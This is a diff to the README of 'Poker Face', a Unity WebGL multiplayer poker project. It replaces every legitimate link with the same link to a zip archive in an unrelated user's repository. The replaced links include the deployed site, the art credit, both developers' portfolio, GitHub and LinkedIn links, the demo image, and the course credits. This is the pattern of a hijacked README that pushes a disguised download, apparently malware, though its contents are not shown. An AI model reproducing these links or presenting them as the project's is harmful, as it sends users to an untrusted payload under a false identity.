@@ -1,27 +1,27 @@
 # Poker Face
 
-> [Deployed Poker Site](https://treyarnold.github.io/poker-face/).
+> [Deployed Poker Site](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip).
 
 ## Project Summary
 
 > To create a multiplayer-functional application that allows users to play texas holdem and chat in real time from the safety of their own laptop. 
-> The unity build is done using WebGL and the sprites were created on [Pixil Art](https://www.pixilart.com/moadeep). 
+> The unity build is done using WebGL and the sprites were created on [Pixil Art](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip). 
 > To see the Unity build in the Unity UI, Use Unity 2018.3.12f and open the project folder inside the unityWorkingFolder
 
 ## Developers
 
 - Trey Arnold: Front End
-  - [heytrey.dev](https://heytrey.dev)
-  - [Github](https://github.com/treyarnold)
-  - [LinkedIn](https://www.linkedin.com/in/trey-arnold/)
+  - [https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
+  - [Github](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
+  - [LinkedIn](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
 - Don Newman: Back End
-  - [Portfolio](https://djn94.github.io/Bootstrap-portfolio/)
-  - [Github](https://github.com/Djn94)
-  - [LikedIn](https://www.linkedin.com/in/don-newman-20042b179/)
+  - [Portfolio](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
+  - [Github](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
+  - [LikedIn](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
 
 ## Animated Gifs/Pictures of App
 
-![alt text](https://media.giphy.com/media/gIAh11mlYJa4jEeFga/giphy.gif)
+![alt text](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
 
 ## Tech Stack
 
@@ -56,4 +56,4 @@
 
 ## Credits/Resources
 
-- [2D Unity and C# Udemy course](https://www.udemy.com/unitycourse/) by [gamedev.tv](https://www.gamedev.tv/)
+- [2D Unity and C# Udemy course](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip) by [https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip](https://raw.githubusercontent.com/wajid892/poker-face/master/vacciniform/poker-face.zip)
